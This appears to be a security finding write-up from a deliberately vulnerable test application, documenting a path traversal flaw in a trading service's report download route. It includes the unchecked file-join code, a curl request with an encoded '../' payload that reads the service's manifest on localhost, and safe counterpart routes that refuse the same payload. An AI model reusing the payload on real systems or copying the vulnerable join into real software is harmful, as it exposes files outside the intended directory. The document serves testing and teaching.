# Path traversal in a report download of `trading` (FS-004)

**Family:** `FS` · **Service:** `trading` · **Surface:** REST · **Scanner:** SAST · **OWASP:** A01

A download route takes a file name from the caller and joins it to a directory.
Nothing checks where the joined path lands, so a name that climbs out of the
directory reads any file the service's own user can read — here, the
application's own manifest, which is the harmless marker this scenario proves
itself with.

The reproduction was run on 2026-11-27 against the service alone, on
`127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is
Alice's token. The report files of a run live under
`apps/trading/reports/files/`.

## FS-004 — `GET /internal/reports/files/:name`

The line (`apps/trading/src/reports/reports-files.controller.ts`):

```ts
// FS-004 / CWE-22: the name is joined to the directory as it came, and nothing checks where the path lands
const contents = await readFile(join(REPORTS_DIRECTORY, name));
```

```console
$ curl -s $URL/internal/reports/files/..%2F..%2Fpackage.json -H "authorization: Bearer $A"
{
  "name": "@zazzles/exchange-trading",
  "version": "0.0.0",
  "description": "Markets, prices, wallets, orders, trades and reports of VCX",
  "private": true,
  "license": "MIT",
  "type": "module",
  ...
```

Two directories above the reports directory sits this service's `package.json`:
read on a user's token. What was gained is a file outside the export directory,
reached by nothing more than a name.

**Counterpart 1 — `GET /internal/reports/:id`.** The file's name comes from the
database row, never from the caller; there is no name to climb with.

```console
$ curl -s $URL/internal/reports/1 -H "authorization: Bearer $A"
{"report":{"id":"1","userId":"u-alice","kind":"statement","storedName":"statement-u-alice.csv",
 "createdAt":"2026-01-01T00:00:00.000Z"}}
```

An id nothing stores answers `NOT_FOUND`.

**Counterpart 2 — `GET /internal/reports/file/:name`.** The name is resolved
under the directory and checked to stay inside it:

```console
$ curl -s $URL/internal/reports/file/..%2F..%2Fpackage.json -H "authorization: Bearer $A"
{"message":"A report is read under its own directory","error":"Forbidden","statusCode":403}
```

`FORBIDDEN`, before anything is read. A caller's own stored name downloads
normally; another user's stored name answers `NOT_FOUND`.

## The tests

`apps/trading/test/scenarios/exports.int-spec.ts` — one payload, sent to the
traversal route and to both counterparts. The exploit assertion names what was
gained (this service's manifest); the counterpart assertions name why it was
refused. The Postman collection `postman/trading/` carries one request in its
`FS` folder.

## Scope of the counterparts

Each counterpart claim is scoped: this route, receiving this name, refuses it
for this reason. Nothing here says any file route is secure in general.
